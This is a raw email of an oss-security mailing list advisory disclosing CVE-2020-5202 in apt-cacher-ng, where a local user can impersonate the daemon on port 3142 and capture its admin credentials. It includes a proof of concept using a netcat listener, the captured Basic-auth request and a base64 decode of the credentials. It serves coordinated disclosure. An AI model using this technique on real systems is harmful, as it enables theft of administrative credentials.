X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["4412" "Monday" "20" "January" "2020" "15:36:08" "+0100" "Matthias Gerstner" "mgerstner@suse.de" "<20200120143608.GE10486@f195.suse.de>" "121" "[oss-security] CVE-2020-5202: apt-cacher-ng: a local unprivileged user can impersonate the apt-cacher-ng daemon, possible credentials leak" nil nil nil "1" "2020012014:36:08" "[oss-security] CVE-2020-5202: apt-cacher-ng: a local unprivileged user can impersonate the apt-cacher-ng daemon, possible credentials leak" (number mark "U       mgerstner@su Jan 20  121/4412  " thread-indent "\"[oss-security] CVE-2020-5202: apt-cacher-ng: a local unprivileged user can impersonate the apt-cacher-ng daemon, possible credentials leak\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-5202: apt-cacher-ng: a local unprivileged user can impersonate the apt-cacher-ng daemon, possible credentials leak" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 18219 invoked by uid 550); 20 Jan 2020 14:36:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 18199 invoked from network); 20 Jan 2020 14:36:20 -0000
X-Virus-Scanned: by amavisd-new at test-mx.suse.de
Date: Mon, 20 Jan 2020 15:36:08 +0100
From: Matthias Gerstner <mgerstner@suse.de>
To: oss-security@lists.openwall.com
Message-ID: <20200120143608.GE10486@f195.suse.de>
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
	protocol="application/pgp-signature"; boundary="4eRLI4hEmsdu6Npr"
Content-Disposition: inline
User-Agent: Mutt/1.10.1 (2018-07-13)
Subject: [oss-security] CVE-2020-5202: apt-cacher-ng: a local unprivileged user can
 impersonate the apt-cacher-ng daemon, possible credentials leak

--4eRLI4hEmsdu6Npr
Content-Type: text/plain; charset=iso-8859-1
Content-Disposition: inline
Content-Transfer-Encoding: quoted-printable

Hi,

apt-cacher-ng is a caching proxy for downloading packages from
Debian-style software repositories [1]. In the course of a code review
of apt-cacher-ng I noticed a possible credentials leak when
"AdminAuth" is enabled in /etc/apt-cacher-ng/security.conf.

The apt-cacher-ng daemon listens on TCP port 3142 on all network
interfaces but also creates a UNIX domain socket in
/run/apt-cacher-ng/socket. The cron job script
/etc/cron.daily/apt-cacher-ng runs the following command:

/usr/lib/apt-cacher-ng/acngtool maint -c /etc/apt-cacher-ng SocketPath=3D/v=
ar/run/apt-cacher-ng/socket

SocketPath is explicitly specified on the command line, trying to force
a connection to the daemon via the socket path. However, `acngtool` does
not act accordingly. Instead, when using the default configuration, it
connects to localhost:3142. This stems from the source file
source/acngtool.cc:503 (based on apt-cacher-ng 3.1 that I have looked
into), where the following is found:

```
	auto nips =3D Tokenize(cfg::bindaddr, SPACECHARS, hostips, true);
	if (!nips)
		hostips.emplace_back("localhost");
```

Since port 3142 is not a privileged network port, any local user may
bind to this port. Should the actual apt-cacher-ng daemon not (yet) be
running, a local unprivileged user can impersonate the daemon, and the
cron.daily/apt-cacher-ng script will sooner or later pass the AdminAuth
credentials to it. This is the proof of concept I tested on Debian 9:

```
# make sure AdminAuth is enabled
root # grep AdminAuth /etc/apt-cacher-ng/security.conf=20
AdminAuth: mooma:moopa

# simulate the apt-cacher-ng daemon not running
root # systemctl stop apt-cacher-ng

# in a second shell run netcat as a regular user on port 3142
user $ nc -l -p 3142

# simulate the cron job being executed
root # /etc/cron.daily/apt-cacher-ng

# now you should see the following output in the netcat shell=20
GET /acng-report.html?doExpire=3DStart%2bExpiration&abortOnErrors=3DaOe HTT=
P/1.1
User-Agent: Debian Apt-Cacher-NG/2
Host: localhost
Authorization: Basic bW9vbWE6bW9vcGE=3D
Cache-Control: no-store,no-cache,max-age=3D0
Accept: application/octet-stream
Accept-Encoding: identity
Connection: close
```

# base64 decoding the auth data, the local unprivileged user obtained
# the authentication data for apt-cacher-ng
user $ echo 'bW9vbWE6bW9vcGE=3D' | base64 -d
mooma:moopa
```

The issue is more severe in the openSUSE packaging where the
apt-cacher-ng daemon is not started by default, but only by explicit
Administrator configuration, which results in the attack surface being
exposed by default. But also when apt-cacher-ng crashes or can be
crashed by a local attacker, the information leak could be achieved.

Debian Upstream has already published an update with a suitable bugfix
for Debian sid [2]. I've informed the upstream author on 2019-11-26
about this issue, the Debian security team was involved, patches
reviewed and agreed upon.

[1]: https://wiki.debian.org/AptCacherNg
[2]: https://security-tracker.debian.org/tracker/CVE-2020-5202

Cheers

Matthias

--=20
Matthias Gerstner <matthias.gerstner@suse.de>
Dipl.-Wirtsch.-Inf. (FH), Security Engineer
https://www.suse.com/security
Phone: +49 911 740 53 290
GPG Key ID: 0x14C405C971923553

SUSE Software Solutions Germany GmbH
HRB 36809, AG N=FCrnberg
Gesch=E4ftsf=FChrer: Felix Imend=F6rffer

--4eRLI4hEmsdu6Npr
Content-Type: application/pgp-signature; name="signature.asc"

-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEE82oG1A8ab1eESZdjFMQFyXGSNVMFAl4lutgACgkQFMQFyXGS
NVNoLg//bkifoIM+Yl3HDdgjYwoRUOp/jW5r4PWVn4U65HSI0R5EmvDoRZncJn97
ztrujEGOvPqrg34fmFQJ1x20G9L2krgnC+358rAh51X8+F8cp/OXJYbNPcHortX1
kG8maJy+mXMvFihBopbL3vhtG3lNF14AiyLAMCRo22McIqNMeeSsPFbA7NRbkUn+
8lRkkIkXuVQ5Od9wt71eXDPY1tp4KDmKOG+dAxsEJli1E6zryMAx+jHyHw1Sax79
DopMDiZrd+JaxHsnu7KC8qxFdlB0cL/TnEtpyCuJwnIbHzCL/pzHV/w53hAU+f9m
6QSgj6YgvymfIrK35PR3VrePdtULh+ADyXcCX+OAEo2/x5FLwPRE6ikxwe/1tzCR
sfhyBUm+6O/9vrToRGKZGtjuOBeFHXxE1VHF6EvTdulAslna3ftbEXVSzz9y+25m
S8BWFl4uhTlJIPgzqge+jcAG5HuQfvYOT6c69mr7rHaDMeO3p2wOVA3YRAJBEpPT
bZB0uIDD+ccA1uUUt0hfnXkgZLeeRM8YssTUW+DnG1Udgk4N8i0CyBLgHf0aUmey
Oj2hjqKJnHHCPhTzmSAZh14NOjxqtT32rCWLZ/4VswOzansfZsRlptb/9hkcYoyb
TiNRdGDc3MFUzHTAuSWRjDcmQHFfXQFcxdtyzZXlHCaiZz2xkMk=
=GE0k
-----END PGP SIGNATURE-----

--4eRLI4hEmsdu6Npr--
